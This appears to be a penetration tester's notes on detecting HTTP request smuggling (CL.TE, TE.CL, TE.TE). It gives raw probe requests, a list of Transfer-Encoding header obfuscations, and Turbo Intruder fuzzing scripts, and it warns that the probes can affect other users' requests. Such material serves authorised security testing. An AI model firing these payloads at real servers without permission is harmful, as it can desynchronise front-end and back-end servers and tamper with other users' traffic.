### CL.CL
if you got normal `response` from the following request, you should try to obfuscate `TE` header:
```http
POST / HTTP/1.1
Transfer-Encoding: chunked
Content-Length: 6
\r\n
3\r\n
abc\r\n
X\r\n
\r\n
```

If it timeout it means it's one of those `TE.TE / TE.CL / CL.TE`

---
### TE.CL
After that run the following request, and you should get `timeOut`:
```http
POST / HTTP/1.1

Transfer-encoding: chunked
content-length: 6
/r/n
0/r/n
/r/n
X/r/n
```

if you got response its either `CL.TE / TE.TE`

> [!attention] 
> This trigger http request smuggling for other users

---
### CL.TE
After that run the following request, and you should get `timeout`. it you got response its `TE.TE`
```http
POST / HTTP/1.1
Transfer-Encoding: chunked
Content-Length: 6
\r\n
3\r\n
abc\r\n
0\r\n
\r\n
```

Otherwise its `TE.TE`

---
### TE.TE
If you got response from the previous request, you should try to obfuscate the `TE` header to make one server accept it and other doesn't recognize it.
```http
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

Use this request as blueprint, your goal is to try as hard as you can to get `timeout` to confirm `TE.CL`:
```http
POST / HTTP/1.1
content-length: 6
Transfer-encoding: chunked
/r/n
0/r/n
/r/n
X/r/n
```

Use this request as blueprint, your goal is to try as hard as you can to get `timeout` to confirm `CL.TE`:
```http
POST / HTTP/1.1
content-length: 6
Transfer-encoding: chunked
/r/n
3/r/n
abc/r/n
0/r/n
/r/n
```
#### Automation
Turbo Intruder
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=1,
                          pipeline=False)
    
    # Load payloads from file
    with open('/path/to/your/wordlist.txt', 'r') as f:
        payloads = f.readlines()
    
    for payload in payloads:
        # Strip newline characters from the file
        payload = payload.strip()
        # Replace literal \r\n with actual CRLF
        payload = payload.replace('\\r\\n', '\r\n')
        # Replace literal \n with actual LF
        payload = payload.replace('\\n', '\n')
        
        engine.queue(target.req, payload)

def handleResponse(req, interesting):
    table.add(req)
```

base reqeust

```http
POST / HTTP/1.1
Host: example.com
%s
content-length: 6

0

X

```
or
```http
POST / HTTP/1.1
Host: example.com
%s
content-length: 6

3
abc
0


```
- `%s` is the placeholder.
 



```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=1,
                          pipeline=False)
    
    # Load payloads from file
    with open('/home/slom/.opt/wordlist/TE.Header_obfuscation.txt', 'r') as f:
        payloads = f.readlines()
    
    for payload in payloads:
        # Strip newline characters from the file
        payload = payload.strip()
        # Replace literal \r\n with actual CRLF
        payload = payload.replace('\\r\\n', '\r\n')
        # Replace literal \n with actual LF
        payload = payload.replace('\\n', '\n')
        
        engine.queue(target.req, payload)

def handleResponse(req, interesting):
    table.add(req)
```